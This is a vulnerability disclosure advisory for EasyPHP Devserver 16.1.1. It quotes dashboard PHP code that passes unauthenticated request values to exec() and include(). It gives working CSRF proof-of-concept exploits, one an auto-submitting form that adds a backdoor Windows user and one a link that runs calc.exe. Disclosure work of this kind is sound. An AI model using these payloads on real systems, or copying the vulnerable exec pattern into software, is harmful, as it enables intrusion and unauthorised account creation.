 
 
Vendor:
===============
www.easyphp.org
 
 
 
Product:
=============================
EasyPHP Devserver v16.1.1
 
easyphp-devserver-16.1.1-setup.exe
hash: 64184d330a34be9e6c029ffa63c903de
 
 
A complete WAMP environment for PHP development & personal web hosting.
Host with Webserver PHP, Apache, MySQL, Nginx, PhpMyAdmin,
Xdebug, PostgreSQL, MongoDB, Python, Ruby...for Windows.
 
 
Vulnerability Type:
=================================
CSRF / Remote Command Execution
 
 
 
CVE Reference:
==============
N/A
 
 
 
Vulnerability Details:
=====================
 
EasyPHP Devserver dashboard runs on port 1111, the PHP code contains
mulitple RCE vectors, which can allow
arbitrary OS commands to be executed on the target system by remote
attackers, if a user visits malicious webpage or link.
 
The "index.php" and "explorer.php" files both contain vulnerable code that
will happily process both GET / POST RCE requests.
Below EasyPHP Code contains no CSRF token or checks whatsoever. All
attacker needs is to supply &#039;type&#039; and command values.
 
Possibility for RFI (remote file inclusion) if the "allow_url_include=0"
setting is changed in "php.ini" configuration.
No checks or CSRF tokens for PHP include directives either, the default
however is set to Off.
 
e.g. RFI attempt result
Warning: include(): http:// wrapper is disabled in the server configuration
by allow_url_include=0
 
 
line 8 of "explorer.php"
======================
 
//== ACTIONS
==================================================================
 
if (isset($_POST[&#039;action&#039;])) {
 
// Include and exec
if (isset($_POST[&#039;action&#039;][&#039;request&#039;])) {
foreach ($_POST[&#039;action&#039;][&#039;request&#039;] as $request) {
if ($request[&#039;type&#039;] == &#039;include&#039;) include(urldecode($request[&#039;value&#039;]));
if ($request[&#039;type&#039;] == &#039;exe&#039;) exec(urldecode($request[&#039;value&#039;]));
}
}
$redirect = "http://" . $_SERVER[&#039;HTTP_HOST&#039;] . $_SERVER[&#039;REQUEST_URI&#039;];
header("Location: " . $redirect);
exit;
}
 
 
//////////////////////////////////////////////////
 
line 48 "index.php"
==================
 
 
//== ACTIONS
==================================================================
 
if (isset($_POST[&#039;action&#039;])) {
 
// Include and exec
if (isset($_POST[&#039;action&#039;][&#039;request&#039;])) {
foreach ($_POST[&#039;action&#039;][&#039;request&#039;] as $request) {
if ($request[&#039;type&#039;] == &#039;include&#039;) include(urldecode($request[&#039;value&#039;]));
if ($request[&#039;type&#039;] == &#039;exe&#039;) exec(urldecode($request[&#039;value&#039;]));
}
}
sleep(1);
$redirect = "http://" . $_SERVER[&#039;HTTP_HOST&#039;] . $_SERVER[&#039;REQUEST_URI&#039;];
header("Location: " . $redirect);
exit;
}
 
if (isset($_GET[&#039;action&#039;])) {
// Include and exec
if ($_GET[&#039;action&#039;] == &#039;include&#039;) include(urldecode($_GET[&#039;value&#039;]));
if ($_GET[&#039;action&#039;] == &#039;exe&#039;) exec(urldecode($_GET[&#039;value&#039;]));
if (isset($_GET[&#039;redirect&#039;])) {
$redirect = urldecode($_GET[&#039;redirect&#039;]);
} else {
$redirect = &#039;http://127.0.0.1:1111/index.php&#039;;
}
sleep(1);
header("Location: " . $redirect);
exit;
}
 
 
 
 
Exploit code(s):
===============
 
1) Add Backdoor User Account
 
<form action="http://127.0.0.1:1111/explorer.php" method="post">
<input type="hidden" name="action[request][0][type]" value="exe">
<input type="hidden" name="action[request][0][value]" value="net user EVIL
Password /add">
<script>document.forms[0].submit()</script>
</form>
 
 
 
2) Run "calc.exe"
 
<a href="http://127.0.0.1:1111/index.php?action=exe&value=calc.exe
">Clicky...</a>
 
 
 
 
Disclosure Timeline:
======================================
Vendor Notification: No replies
November 22, 2016 : Public Disclosure

